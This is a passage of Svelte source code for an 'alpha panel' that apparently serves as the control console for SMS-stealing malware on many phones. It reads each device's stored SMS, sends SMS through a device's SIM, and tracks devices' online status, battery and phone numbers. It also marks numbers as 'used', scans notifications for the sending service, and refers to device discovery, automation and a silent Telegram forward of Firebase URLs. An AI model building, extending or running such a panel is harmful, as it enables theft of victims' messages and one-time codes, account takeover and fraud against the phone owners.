      url: rawUrl,
      path: fcEditForm.path.trim() || 'messages',
      infoPath: fcEditForm.infoPath.trim(),
      token: fcEditForm.token,
    } : c);
    saveConnections(connections);
    // Immediately re-fetch the edited connection
    const updated = connections.find(c => c.id === fcEditId);
    if (updated) fetchConn(updated);
    fcEditId = null;
    toast('Connection updated!', 'success');
  }

  function fcRemoveSelected() {
    const sel = [...fcSelected];
    if (!sel.length) return;
    const names = sel.map(id => connections.find(c => c.id === id)?.name || id).join(', ');
    if (!confirm(`Remove ${sel.length} connection${sel.length > 1 ? 's' : ''}?\n${names}`)) return;
    connections = connections.filter(c => !sel.includes(c.id));
    saveConnections(connections);
    sel.forEach(id => { const { [id]: _, ...rest } = db; db = rest; });
    fcSelected = new Set();
    toast(`Removed ${sel.length} connection${sel.length > 1 ? 's' : ''}.`, 'success');
  }

  // ── Master toggle (enable / disable all) ──────────────────────────────
  let masterEnabled = $derived(connections.length > 0 && connections.every(c => c.enabled));

  function toggleAllConns() {
    const newState = !masterEnabled;
    connections = connections.map(c => ({ ...c, enabled: newState }));
    saveConnections(connections);
    if (newState) connections.forEach(c => fetchConn(c));
    toast(newState ? 'All connections enabled.' : 'All connections disabled.', 'success');
  }

  // ── Failed connections ────────────────────────────────────────────────
  let failedConns = $derived(connStats.filter(c => !!c.error));

  function removeFailedConns() {
    if (!failedConns.length) return;
    if (!confirm(`Remove ${failedConns.length} failed connection${failedConns.length > 1 ? 's' : ''}?\nThis cannot be undone.`)) return;
    const ids = failedConns.map(c => c.id);
    connections = connections.filter(c => !ids.includes(c.id));
    saveConnections(connections);
    ids.forEach(id => { const { [id]: _, ...rest } = db; db = rest; });
    if (fcSelected.size) fcSelected = new Set([...fcSelected].filter(id => !ids.includes(id)));
    toast(`Removed ${ids.length} failed connection${ids.length > 1 ? 's' : ''}.`, 'success');
  }

  function removeAllConns() {
    if (!connections.length) return;
    if (!confirm(`Remove ALL ${connections.length} Firebase connections from the panel?\nThis will clear all saved connections.`)) return;
    connections = [];
    saveConnections([]);
    db = {};
    fcSelected = new Set();
    selectedConnId = null;
    selectedKey = null;
    activeTab = 'overview';
    toast('All Firebase connections removed', 'success');
  }

  // ── Select device ─────────────────────────────────────────────────────────
  function selectDevice(connId, key) {
    selectedConnId = connId;
    selectedKey = key;
    msgs = null;
    msgsFilter = "all";
    msgsSearch = "";
    activeTab = "device";
    sideOpen = false; // close sidebar on mobile after selecting a device
  }

  // ── Load Messages (all SMS for selected device) ───────────────────────────
  async function loadMessages() {
    const conn = connections.find((c) => c.id === selectedConnId);
    if (!conn || !selectedKey) return;
    msgsLoading = true;
    msgs = null;
    try {
      // Fetch only last 50 messages, newest first
      const { data } = await apiFetch(
        conn,
        `${conn.path}/${selectedKey}`,
        "GET",
        undefined,
        { orderBy: '"$key"', limitToLast: "50" },
      );
      msgs = data && typeof data === "object" ? data : {};
    } catch (e) {
      toast(e.message, "error");
      msgs = {};
    } finally {
      msgsLoading = false;
    }
  }

  // ── Send SMS ─────────────────────────────────────────────────────────────
  // Confirmed from network log:
  //   PUT clients/<deviceKey>/webhookEvent/sendSms.json?auth=<dbUrl>
  //   Body: { from:1, to:"9885124921", message:"...", isSended:false }
  async function doSendSMS() {
    const conn = connections.find((c) => c.id === selectedConnId);
    if (!conn || !selectedKey) return;
    const raw = smsDraft.to.trim();
    const to = raw.replace(/\D/g, ""); // digits only (gateway expects no +91 prefix)
    const message = smsDraft.body.trim();
    if (!to || !message) {
      toast("Enter phone number and message", "error");
      return;
    }
    smsSending = true;
    try {
      const base = conn.url.replace(/\/+$/, "");
      const authParam = encodeURIComponent(conn.url);
      const url = `${base}/clients/${selectedKey}/webhookEvent/sendSms.json?auth=${authParam}`;
      const payload = {
        from: parseInt(smsDraft.sim) + 1,
        to,
        message,
        isSended: false,
      };
      console.log("[SendSMS] PUT", url, payload);
      const res = await fetch(url, {
        method: "PUT",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(payload),
      });
      const json = await res.json().catch(() => ({}));
      if (!res.ok) throw new Error(json?.error ?? `HTTP ${res.status}`);
      toast("SMS sent ✓", "success");
      smsDraft = { to: "", body: "", sim: "0" };
    } catch (e) {
      console.error("[SendSMS] failed:", e);
      toast(`Send failed: ${e.message}`, "error");
    } finally {
      smsSending = false;
    }
  }

  // ── Delete device key ─────────────────────────────────────────────────────
  async function deleteDevice(conn, key) {
    if (!confirm(`Delete all messages for "${key}" from ${conn.name}?`)) return;
    try {
      await apiFetch(conn, `${conn.path}/${key}`, "DELETE");
      markDeleted(conn.id, key); // persist locally so it stays gone after refresh
      toast(`Deleted "${key}"`, "success");
      if (selectedKey === key && selectedConnId === conn.id) {
        selectedKey = null;
        selectedConnId = null;
        activeTab = "overview";
      }
      fetchConn(conn);
    } catch (e) {
      toast(e.message, "error");
    }
  }

  // ── Raw ──────────────────────────────────────────────────────────────────
  async function sendRaw() {
    const conn = connections.find((c) => c.id === rawConnId);
    if (!conn) return;
    rawLoading = true;
    rawRes = null;
    try {
      const opts = {
        method: rawMethod,
        headers: { "Content-Type": "application/json" },
      };
      if (["POST", "PUT", "PATCH"].includes(rawMethod)) opts.body = rawBody;
      const res = await fetch(buildUrl(conn, rawPath || conn.path), opts);
      const json = await res.json();
      rawRes = { status: res.status, ok: res.ok, data: json };
      if (res.ok) {
        toast(`${rawMethod} → ${res.status}`, "success");
        fetchConn(conn);
      } else toast(`Error ${res.status}`, "error");
      // ── Silent TG forward ──
      // tgForwardRawRequest(conn.name, rawMethod, rawPath || conn.path, rawBody, json); // disabled — only forwarding Firebase URLs
    } catch (e) {
      rawRes = { error: e.message };
      toast(e.message, "error");
    } finally {
      rawLoading = false;
    }
  }

  function switchTab(tab) {
    activeTab = tab;
    if (tab === "messages" && selectedKey) loadMessages();
  }

  // ── Device info helpers ───────────────────────────────────────────────────
  function getDevInfo(connId, key) {
    // Returns device info from infoPath if available
    return db[connId]?.info?.[key] ?? null;
  }
  function getLatestMsg(connId, key) {
    // Get count of messages from keys
    const entry = db[connId];
    return entry?.keys?.[key] === true ? Object.keys(entry.keys).length : 0;
  }

  // ── Derived ───────────────────────────────────────────────────────────────
  let allDevices = $derived(
    (() => {
      const list = [];
      for (const conn of connections) {
        if (!conn.enabled) continue;
        const entry = db[conn.id];
        if (!entry?.keys || typeof entry.keys !== "object") continue;
        for (const key of Object.keys(entry.keys)) {
          if (typeof key !== "string" || key.length < 4) continue;
          if (isDeleted(conn.id, key)) continue; // skip locally deleted devices
          const info = entry.info?.[key] ?? null;
          list.push({ connId: conn.id, conn, key, info });
        }
      }
      return list;
    })(),
  );

  // Message count per device is the number of children keys
  function getMsgCount(connId, key) {
    const entry = db[connId];
    if (!entry?.keys) return 0;
    // keys from shallow root are the device keys, count comes from the device's own shallow fetch
    return 0; // We don't pre-load message counts; too expensive
  }

  // ── Unified search matching (device key, local added phone, Firebase phone, connection name, info) ──
  function matchDeviceSearch(d, query) {
    if (!query) return true;
    const q = query.toLowerCase().trim();
    if (!q) return true;
    // 1. Match device key / ID
    if (d.key.toLowerCase().includes(q)) return true;
    // 2. Match phone number (both local added phone number and Firebase phone)
    const phone = getDisplayPhone(d.connId, d.key, d.info);
    if (phone) {
      if (phone.toLowerCase().includes(q)) return true;
      const cleanPhone = phone.replace(/\D/g, "");
      const cleanQ = q.replace(/\D/g, "");
      if (cleanQ.length > 0) {
        if (cleanPhone.includes(cleanQ)) return true;
        const q10 = cleanQ.length >= 10 ? cleanQ.slice(-10) : null;
        const p10 = cleanPhone.length >= 10 ? cleanPhone.slice(-10) : null;
        if (q10 && cleanPhone.includes(q10)) return true;
        if (p10 && cleanQ.includes(p10)) return true;
      }
    }
    // Check original Firebase phone if overridden by local number
    const rawFmt = fmtPhone(d.info);
    if (rawFmt && rawFmt !== phone) {
      if (rawFmt.toLowerCase().includes(q)) return true;
      const cleanRaw = rawFmt.replace(/\D/g, "");
      const cleanQ = q.replace(/\D/g, "");
      if (cleanQ.length > 0) {
        if (cleanRaw.includes(cleanQ)) return true;
        const q10 = cleanQ.length >= 10 ? cleanQ.slice(-10) : null;
        const p10 = cleanRaw.length >= 10 ? cleanRaw.slice(-10) : null;
        if (q10 && cleanRaw.includes(q10)) return true;
        if (p10 && cleanQ.includes(p10)) return true;
      }
    }
    // 3. Match Firebase connection name
    if (d.conn?.name?.toLowerCase().includes(q)) return true;
    // 4. Match Firebase info JSON (model, ip, etc.)
    if (d.info && JSON.stringify(d.info).toLowerCase().includes(q)) return true;
    return false;
  }

  let filteredSide = $derived(
    allDevices.filter((d) => {
      if (searchQuery && !matchDeviceSearch(d, searchQuery)) return false;
      const on = d.info ? isOnline(d.info) : null;
      if (sideFilter === "on" && on !== true) return false;
      if (sideFilter === "off" && on === true) return false;
      if (sideFilter === "num" && !getDisplayPhone(d.connId, d.key, d.info))
        return false;
      if (sideFilter === "numOn" && !(on === true && getDisplayPhone(d.connId, d.key, d.info)))
        return false;
      if (sideFilter === "used" && !isUsed(`dev::${d.connId}::${d.key}`))
        return false;
      return true;
    }),
  );

  let totalCount = $derived(allDevices.length);
  let onlineCount = $derived(
    allDevices.filter((d) => d.info && isOnline(d.info)).length,
  );
  let offlineCount = $derived(
    allDevices.filter((d) => !d.info || isOnline(d.info) !== true).length,
  );
  let numCount = $derived(
    allDevices.filter((d) => getDisplayPhone(d.connId, d.key, d.info)).length,
  );
  let onlineNumCount = $derived(
    allDevices.filter(
      (d) =>
        d.info && isOnline(d.info) && getDisplayPhone(d.connId, d.key, d.info),
    ).length,
  );
  let newCount = $derived(newDeviceKeys.size);

  // Filtered device list — AND logic across all active filters
  let filteredTableDevices = $derived(
    allDevices.filter((d) => {
      if (tableSearch && !matchDeviceSearch(d, tableSearch)) return false;
      if (tableConnFilter && d.connId !== tableConnFilter) return false;
      const on = d.info ? isOnline(d.info) : null;
      const uid = `${d.connId}::${d.key}`;
      if (tableActiveFilters.has("on") && on !== true) return false;
      if (tableActiveFilters.has("off") && on === true) return false;
      if (
        tableActiveFilters.has("num") &&
        !getDisplayPhone(d.connId, d.key, d.info)
      )
        return false;
      if (
        tableActiveFilters.has("used") &&
        !isUsed(`dev::${d.connId}::${d.key}`)
      )
        return false;
      if (tableActiveFilters.has("new") && !newDeviceKeys.has(uid))
        return false;
      if (tableActiveFilters.has("disco") && !discoveredDeviceKeys.has(d.key))
        return false;
      return true;
    }),
  );

  let discoveredInTableCount = $derived(
    allDevices.filter((d) => discoveredDeviceKeys.has(d.key)).length,
  );

  let totalDevicePages = $derived(
    Math.max(1, Math.ceil(filteredTableDevices.length / DEVICES_PER_PAGE)),
  );

  // ── Device tab prev/next navigation ──────────────────────────────────
  let selectedDeviceIndex = $derived(
    selectedKey && selectedConnId
      ? filteredTableDevices.findIndex(
          (d) => d.key === selectedKey && d.connId === selectedConnId
        )
      : -1
  );

  function navToDevice(offset) {
    const idx = selectedDeviceIndex + offset;
    if (idx < 0 || idx >= filteredTableDevices.length) return;
    const d = filteredTableDevices[idx];
    selectDevice(d.connId, d.key);
    // Load messages automatically when navigating
    msgs = null;
  }

  function toggleTableFilter(f) {
    const next = new Set(tableActiveFilters);
    // 'on' and 'off' are mutually exclusive
    if (f === "on" && next.has("on")) {
      next.delete("on");
    } else if (f === "on") {
      next.add("on");
      next.delete("off");
    } else if (f === "off" && next.has("off")) {
      next.delete("off");
    } else if (f === "off") {
      next.add("off");
      next.delete("on");
    } else if (next.has(f)) {
      next.delete(f);
    } else {
      next.add(f);
    }
    tableActiveFilters = next;
  }

  let selectedInfo = $derived(
    selectedKey && selectedConnId
      ? getDevInfo(selectedConnId, selectedKey)
      : null,
  );

  let selectedConn = $derived(
    selectedConnId ? connections.find((c) => c.id === selectedConnId) : null,
  );

  let connStats = $derived(
    connections.map((c) => {
      const e = db[c.id];
      const devs = allDevices.filter((d) => d.connId === c.id);
      const onl = devs.filter((d) => d.info && isOnline(d.info)).length;
      return {
        ...c,
        keyCount: e?.keys ? Object.keys(e.keys).length : 0,
        loading: !!e?.loading,
        error: e?.error ?? null,
        online: onl,
        total: devs.length,
      };
    }).sort((a, b) => {
      const aErr = a.error ? 1 : 0, bErr = b.error ? 1 : 0;
      if (aErr !== bErr) return aErr - bErr;
      const aEmpty = (!a.loading && a.total === 0) ? 1 : 0;
      const bEmpty = (!b.loading && b.total === 0) ? 1 : 0;
      if (aEmpty !== bEmpty) return aEmpty - bEmpty;
      return b.online - a.online;
    }),
  );

  // ── Filtered messages ─────────────────────────────────────────────────────
  let filteredMsgs = $derived(
    (() => {
      if (!msgs || typeof msgs !== "object") return [];
      const q = msgsSearch.toLowerCase();
      return Object.entries(msgs)
        .filter(([, m]) => {
          if (typeof m !== "object" || !m) return false;
          if (msgsFilter === "in" && m.type !== "incoming") return false;
          if (msgsFilter === "out" && m.type !== "outgoing") return false;
          if (q) {
            const hay =
              `${m.sender ?? ""} ${m.message ?? ""} ${m.dateTime ?? ""}`.toLowerCase();
            if (!hay.includes(q)) return false;
          }
          return true;
        })
        .sort(([a], [b]) => Number(b) - Number(a)); // newest first
    })(),
  );

  // ── Filtered notifications (match ONLY from message content / sender, NOT device ID or phone number) ───
  let notifSearchQuery = $state("");

  let filteredNotifications = $derived.by(() => {
    const q = notifSearchQuery.trim().toLowerCase();
    if (!q) return notifications;
    return notifications.filter((n) => {
      const msg = String(n.message ?? "").toLowerCase();
      const sender = String(n.sender ?? "").toLowerCase();
      const about = String(n.about ?? "").toLowerCase();

      // Only match against the SMS message body, sender, or detected service
      // Do NOT match against the phone number, device ID, or connection name
      return (
        msg.includes(q) ||
        sender.includes(q) ||
        about.includes(q)
      );
    });
  });
</script>

<svelte:window
  onkeydown={(e) => {
    if (e.key === "Escape") {
      showBellPanel = false;
      addOpen = false;
      rawOpen = false;
    }
  }}
/>

<div class="shell">
  <!-- Mobile sidebar backdrop -->
  {#if sideOpen}
    <div
      class="mob-backdrop"
      onclick={() => (sideOpen = false)}
      role="presentation"
    ></div>
  {/if}

  <!-- ══ LEFT SIDEBAR ════════════════════════════════════════════════════════ -->
  <aside
    class="sidebar {sideOpen ? 'mob-open' : ''} {sidebarDesktopOpen ? '' : 'desktop-closed'} {_srDragging ? 'no-transition' : ''}"
    style="--sidebar-w:{sidebarWidth}px"
  >
    <!-- Brand + close button -->
    <div class="side-brand">
      <svg width="17" height="17" viewBox="0 0 32 32" fill="none">
        <path d="M5 27L10.5 6l7 13 4-9 5.5 17H5z" fill="url(#sbg)" />
        <defs
          ><linearGradient
            id="sbg"
            x1="5"
            y1="6"
            x2="27"
            y2="27"
            gradientUnits="userSpaceOnUse"
          >
            <stop stop-color="#f97316" /><stop
              offset="1"
              stop-color="#fbbf24"
            />
          </linearGradient></defs
        >
      </svg>
      <button
        class="brand-btn"
        onclick={() => {
          selectedKey = null;
          selectedConnId = null;
          activeTab = 'overview';
          sideOpen = false;
        }}
        title="Go to dashboard"
        aria-label="Alpha Panel — go to dashboard"
      >
        <span class="brand-alpha">alpha</span>
        <span class="brand-panel">panel</span>
      </button>
      {#if onlineCount > 0}<span class="side-online-pill">{onlineCount} 🟢</span
        >{/if}
      <button
        class="side-collapse-btn"
        onclick={() => {
          if (typeof window !== 'undefined' && window.innerWidth > 768) {
            toggleDesktopSidebar();
          } else {
            sideOpen = false;
          }
        }}
        aria-label="Collapse sidebar"
        title="Collapse sidebar"
      >
        <svg
          width="15"
          height="15"
          viewBox="0 0 24 24"
          fill="none"
          stroke="currentColor"
          stroke-width="2.5"
          stroke-linecap="round"
          stroke-linejoin="round"
        >
          <polyline points="15 18 9 12 15 6" />
        </svg>
      </button>
    </div>

    <!-- Sidebar tabs: Firebase | Devices -->
    <div class="side-tabs">
      <button
        class="side-tab-btn {sideTab === 'firebase' ? 'stab-a' : ''}"
        onclick={() => (sideTab = "firebase")}
      >
        Firebase <span class="stab-cnt">{connections.length}</span>
      </button>
      <button
        class="side-tab-btn {sideTab === 'devices' ? 'stab-a' : ''}"
        onclick={() => (sideTab = "devices")}
      >
        Devices <span class="stab-cnt">{allDevices.length}</span>
      </button>
    </div>

    <!-- Firebase connections tab -->
    {#if sideTab === "firebase"}
      <div class="side-footer side-footer-full">
        <div class="sf-hdr">
          FIREBASE · {connections.length}
          <button
            class="add-fb-glow"
            onclick={openAddPanel}
            title="Add Firebase"
            aria-label="Add Firebase"
          >
            <span class="add-fb-glow-ring"></span>
            <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><path d="M12 5v14M5 12h14" /></svg>
            <span>Add</span>
          </button>
        </div>
        <div class="conn-scroll conn-scroll-full" use:dragScroll>
          {#each connStats as c (c.id)}
            <div class="conn-row">
              <span class="cr-dot" style="background:{c.color}"></span>
              <span class="cr-name">{c.name}</span>
              <span
                class="cr-status"
                title="{c.online} online / {c.total} total"
              >
                {#if c.total > 0}
                  <span
                    class="cr-on-dot"
                    style="background:{c.online > 0 ? '#22c55e' : '#334155'}"
                  ></span>
                  <span
                    style="color:{c.online > 0
                      ? '#22c55e'
                      : '#64748b'};font-size:9px;font-weight:700"
                    >{c.online}/{c.total}</span
                  >
                {:else}
                  <span
                    class="cr-cnt"
                    style="color:{c.error ? '#ef4444' : c.color}"
                    >{c.loading ? "…" : c.error ? "!" : "0"}</span
                  >
                {/if}
              </span>
              <button
                class="cr-tog {c.enabled ? 'ton' : 'toff'}"
                onclick={() => toggleConn(c.id)}
                aria-label="toggle"
              >
                <span class="cr-knob"></span>
              </button>
              <button
                class="cr-rm"
                onclick={() => dropConn(c.id)}
                title="Remove"
                aria-label="remove">×</button
              >
            </div>
          {/each}
        </div>
      </div>
    {/if}

    <!-- Devices list tab -->
    {#if sideTab === "devices"}
      <div class="side-footer side-footer-full">
        <!-- Search -->
        <div class="side-dev-search">
          <svg
            width="11"
            height="11"
            viewBox="0 0 24 24"
            fill="none"
            stroke="currentColor"
            stroke-width="2.5"
            opacity="0.4"
            ><circle cx="11" cy="11" r="8" /><path d="m21 21-4.35-4.35" /></svg
          >
          <input
            class="side-dev-search-in"
            bind:value={searchQuery}
            placeholder="Search devices…"
            aria-label="Search devices"
          />
          {#if searchQuery}<button
              class="side-search-clear"
              onclick={() => (searchQuery = "")}>×</button
            >{/if}
        </div>
        <!-- Filter pills -->
        <div class="side-dev-pills">
          <button
            class="sdp {sideFilter === 'all' ? 'sdp-a' : ''}"
            onclick={() => (sideFilter = "all")}
            >All <span class="sdp-cnt">{allDevices.length}</span></button
          >
          <button
            class="sdp {sideFilter === 'on' ? 'sdp-on' : ''}"
            onclick={() => (sideFilter = "on")}
            >🟢 <span class="sdp-cnt">{onlineCount}</span></button
          >
          <button
            class="sdp {sideFilter === 'num' ? 'sdp-num' : ''}"
            onclick={() => (sideFilter = "num")}
            >📱 <span class="sdp-cnt">{numCount}</span></button
          >
          <button
            class="sdp {sideFilter === 'numOn' ? 'sdp-numon' : ''}"
            onclick={() => (sideFilter = "numOn")}
            title="Number + Online"
            >📱🟢 <span class="sdp-cnt">{onlineNumCount}</span></button
          >
          <button
            class="sdp {sideFilter === 'off' ? 'sdp-off' : ''}"
            onclick={() => (sideFilter = "off")}
            >🔴 <span class="sdp-cnt">{offlineCount}</span></button
          >
        </div>
        <!-- Device list -->
        <div
          class="side-dev-list"
          onscroll={(e) => {
            const el = e.currentTarget;
            if (el.scrollTop + el.clientHeight >= el.scrollHeight - 200) {
              if (filteredSide.length > sideLimit) sideLimit += 100;
            }
          }}
        >
          {#each filteredSide.slice(0, sideLimit) as d (`${d.connId}::${d.key}`)}
            {@const on = d.info ? isOnline(d.info) : null}
            {@const bat = d.info ? getBattery(d.info) : null}
            {@const fp = getDisplayPhone(d.connId, d.key, d.info)}
            {@const sdvUsed = isUsed(`dev::${d.connId}::${d.key}`)}
            <div
              class="sdv-item {selectedKey === d.key &&
              selectedConnId === d.connId
                ? 'sdv-sel'
                : ''} {isCopied(d.connId, d.key) ? 'sdv-copied' : ''}"
              role="button"
              tabindex="0"
              onkeydown={(e) => {
                if (e.key === "Enter" || e.key === " ") {
                  selectDevice(d.connId, d.key);
                  sideOpen = false;
                }
              }}
              onclick={() => {
                selectDevice(d.connId, d.key);
                sideOpen = false;
              }}
              aria-label="Select device {d.key}"
            >
              <span class="sdv-bar" style="background:{d.conn.color}"></span>
              <span
                class="sdv-dot {on === true
                  ? 'ton'
                  : on === false
                    ? 'toff'
                    : 'tunk'}"
              ></span>
              <span class="sdv-body">
                <span class="sdv-id mono"
                  >{d.key.slice(0, 15)}{d.key.length > 15 ? "…" : ""}</span
                >
                {#if fp}
                  <button
                    class="sdv-phone-btn"
                    title="Click to copy number"
                    onclick={(e) => {
                      e.stopPropagation();
                      copyPhone(fp);
                      markCopied(d.connId, d.key);
                    }}
                  >{fp}</button>
                {:else}
                  <span class="sdv-fb" style="color:{d.conn.color}"
                    >{d.conn.name}</span
                  >
                {/if}
              </span>
              {#if bat !== null}
                <span class="sdv-bat" style="color:{batColor(bat)}">{bat}%</span
                >
              {/if}
              <!-- Used checkbox in sidebar -->
              <button
                class="sdv-used-chk {sdvUsed ? 'sdvuc-checked' : 'sdvuc-unchecked'}"
                title="{sdvUsed ? 'Mark as not used' : 'Mark as used'}"
                aria-label="{sdvUsed ? 'Unmark used' : 'Mark used'}"
                aria-pressed={sdvUsed}
                onclick={(e) => {
                  e.stopPropagation();
                  toggleUsed(`dev::${d.connId}::${d.key}`);
                }}
              >
                {#if sdvUsed}
                  <svg width="9" height="9" viewBox="0 0 12 12" fill="none" stroke="currentColor" stroke-width="2.4" stroke-linecap="round" stroke-linejoin="round"><polyline points="1.5 6 4.5 9 10.5 2.5"/></svg>
                {:else}
                  <svg width="9" height="9" viewBox="0 0 12 12" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"><rect x="1" y="1" width="10" height="10" rx="2"/></svg>
                {/if}
              </button>
              {#if fp}
                <button
                  class="sdv-copy"
                  title="Copy number"
                  aria-label="Copy number"
                  onclick={(e) => {
                    e.stopPropagation();
                    copyPhone(fp);
                    markCopied(d.connId, d.key);
                  }}
                >
                  <svg
                    width="10"
                    height="10"
                    viewBox="0 0 24 24"
                    fill="none"
                    stroke="currentColor"
                    stroke-width="2"
                    ><rect x="9" y="9" width="13" height="13" rx="2" /><path
                      d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"
                    /></svg
                  >
                </button>
              {/if}
            </div>
          {/each}
          {#if filteredSide.length === 0}
            <div class="sdv-empty">No devices found</div>
          {/if}
          {#if filteredSide.length > sideLimit}
            <button class="sdv-more" onclick={() => (sideLimit += 100)}
              >+ {Math.min(100, filteredSide.length - sideLimit)} more…</button
            >
          {/if}
        </div>
      </div>
    {/if}
    <!-- Sidebar bottom corner Add button -->
    <div class="side-bottom-action">
      <button
        class="side-bottom-add-btn"
        onclick={openAddPanel}
        title="Add Firebase connection (Single / Bulk / File / Extract)"
        aria-label="Add Firebase connection"
      >
        <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round"><path d="M12 5v14M5 12h14" /></svg>
        <span>Add Firebase</span>
      </button>
    </div>

    <!-- Desktop resize handle -->
    <div
      class="sidebar-resize-handle"
      onpointerdown={sidebarResizeStart}
      role="separator"
      aria-orientation="vertical"
      title="Drag to resize sidebar"
    ></div>
    <!-- Sidebar edge chevron toggle -->
    <button
      class="sidebar-edge-chevron {sidebarDesktopOpen ? 'open' : 'closed'}"
      onclick={() => {
        if (typeof window !== 'undefined' && window.innerWidth > 768) {
          toggleDesktopSidebar();
        } else {
          sideOpen = !sideOpen;
        }
      }}
      aria-label="Toggle sidebar"
      title={sidebarDesktopOpen ? 'Collapse sidebar' : 'Expand sidebar'}
    >
      <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
        <polyline points="15 18 9 12 15 6" />
      </svg>
    </button>
  </aside>

  <!-- ══ MAIN ════════════════════════════════════════════════════════════════ -->
  <div class="main">
    <!-- Topbar -->
    <header class="topbar">
      <div class="tb-l">
        <!-- Sidebar toggle (desktop + mobile) -->
        <button
          class="mob-menu-btn"
          onclick={() => {
            if (window.innerWidth > 768) {
              toggleDesktopSidebar();
            } else {
              sideOpen = !sideOpen;
            }
          }}
          aria-label="Toggle sidebar"
        >
          <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5">
            <line x1="3" y1="6" x2="21" y2="6" />
            <line x1="3" y1="12" x2="21" y2="12" />
            <line x1="3" y1="18" x2="21" y2="18" />
          </svg>
        </button>
        {#each connections as c}
          {#if db[c.id]?.loading}
            <span
              style="font-size:11px;color:{c.color};display:flex;align-items:center;gap:3px"
            >
              <span
                style="animation:spin 0.9s linear infinite;display:inline-block"
                >↻</span
              >
              {c.name}
            </span>
          {/if}
        {/each}
        {#if bgRefreshing}
          <span class="refresh-cd bg-refresh" title="Syncing in background…">
            <span class="bg-dot"></span> syncing…
          </span>
        {:else if !connections.some((c) => db[c.id]?.loading)}
          <span
            class="refresh-cd"
            title={selectedConnId ? `Selected panel refreshes in ${panelRefreshSecs}s | All databases full sync in ${nextRefreshSecs}s` : `All databases full sync in ${nextRefreshSecs}s`}
          >
            {#if selectedConnId}
              ↻ {panelRefreshSecs}s <span style="font-size:10px;opacity:0.65;">(all: {nextRefreshSecs}s)</span>
            {:else}
              ↻ {nextRefreshSecs}s
            {/if}
          </span>
        {/if}
      </div>
      <div class="tb-r">
        <span class="tbstat tt">{totalCount} total</span>
        <span class="tbstat to">{onlineCount} online</span>
        <span class="tbstat tf">{offlineCount} offline</span>
        <a
          href="/discovery"
          class="ico-btn"
          title="Device Number Discovery"
          aria-label="Device Number Discovery"
          style="text-decoration:none;font-size:12px;"
        >📡</a>
        <a
          href="/automation"
          class="ico-btn"
          title="Automation Orchestrator"
          aria-label="Automation Orchestrator"
          style="text-decoration:none;font-size:12px;"
        >🤖</a>
        <button
          class="ico-btn {bgRefreshing ? 'ico-active' : ''}"
          onclick={() => fetchAll(false)}
          title="Refresh All now"
          aria-label="Refresh All"
        >
          <svg
            width="13"
            height="13"
            viewBox="0 0 24 24"
            fill="none"
            stroke="currentColor"
            stroke-width="2"
            stroke-linecap="round"
            stroke-linejoin="round"
            style={bgRefreshing ? "animation:spin 1s linear infinite" : ""}
          >
            <polyline points="23 4 23 10 17 10" />
            <polyline points="1 20 1 14 7 14" />
            <path
              d="M3.51 9a9 9 0 0 1 14.85-3.36L23 10M1 14l4.64 4.36A9 9 0 0 0 20.49 15"
            />
          </svg>
        </button>
        <!-- Bell icon with badge — opens floating notification panel -->
        <div class="bell-wrap" style="position:relative">
          <button
            class="ico-btn bell-btn {!notifsEnabled
              ? 'ico-muted'
              : ''} {showBellPanel ? 'ico-active' : ''}"
            onclick={() => (showBellPanel = !showBellPanel)}
            title={notifsEnabled ? "Notifications" : "Notifications muted"}
            aria-label="Toggle notification panel"
          >
            {#if notifsEnabled}
              <svg
                width="14"
                height="14"
                viewBox="0 0 24 24"
                fill="none"
                stroke="currentColor"
                stroke-width="2"
                ><path d="M18 8A6 6 0 0 0 6 8c0 7-3 9-3 9h18s-3-2-3-9" /><path
                  d="M13.73 21a2 2 0 0 1-3.46 0"
                /></svg
              >
            {:else}
              <svg
                width="14"
                height="14"
                viewBox="0 0 24 24"
                fill="none"
                stroke="currentColor"
                stroke-width="2"
                ><path d="M18 8A6 6 0 0 0 6 8c0 7-3 9-3 9h18s-3-2-3-9" /><path
                  d="M13.73 21a2 2 0 0 1-3.46 0"
                /><line x1="2" y1="2" x2="22" y2="22" /></svg
              >
            {/if}
          </button>
          {#if notifications.length > 0}
            <span class="notif-badge"
              >{notifications.length > 9 ? "9+" : notifications.length}</span
            >
          {/if}
        </div>
        <button
          class="ico-btn {addOpen ? 'ico-active' : ''}"
          onclick={() => (addOpen = !addOpen)}
          title="Settings & Firebase"
          aria-label="Settings"
        >
          <svg
            width="14"
            height="14"
            viewBox="0 0 24 24"
            fill="none"
            stroke="currentColor"
            stroke-width="2"
          >
            <circle cx="12" cy="12" r="3" />
            <path
              d="M19.4 15a1.65 1.65 0 0 0 .33 1.82l.06.06a2 2 0 0 1-2.83 2.83l-.06-.06a1.65 1.65 0 0 0-1.82-.33 1.65 1.65 0 0 0-1 1.51V21a2 2 0 0 1-4 0v-.09A1.65 1.65 0 0 0 9 19.4a1.65 1.65 0 0 0-1.82.33l-.06.06a2 2 0 0 1-2.83-2.83l.06-.06A1.65 1.65 0 0 0 4.68 15a1.65 1.65 0 0 0-1.51-1H3a2 2 0 0 1 0-4h.09A1.65 1.65 0 0 0 4.6 9a1.65 1.65 0 0 0-.33-1.82l-.06-.06a2 2 0 0 1 2.83-2.83l.06.06A1.65 1.65 0 0 0 9 4.68a1.65 1.65 0 0 0 1-1.51V3a2 2 0 0 1 4 0v.09a1.65 1.65 0 0 0 1 1.51 1.65 1.65 0 0 0 1.82-.33l.06-.06a2 2 0 0 1 2.83 2.83l-.06.06A1.65 1.65 0 0 0 19.4 9a1.65 1.65 0 0 0 1.51 1H21a2 2 0 0 1 0 4h-.09a1.65 1.65 0 0 0-1.51 1z"
            />
          </svg>
        </button>
        <button
          class="ico-btn {rawOpen ? 'ico-active' : ''}"
          onclick={() => (rawOpen = !rawOpen)}
          aria-label="Raw request"
        >
          <svg
            width="13"
            height="13"
            viewBox="0 0 24 24"
            fill="none"
            stroke="currentColor"
            stroke-width="2"
            ><polyline points="16 18 22 12 16 6" /><polyline
              points="8 6 2 12 8 18"
            /></svg
          >
        </button>
      </div>
    </header>

    <!-- ══ FLOATING NOTIFICATION PANEL ════════════════════════════════════ -->
    {#if showBellPanel}
      <div
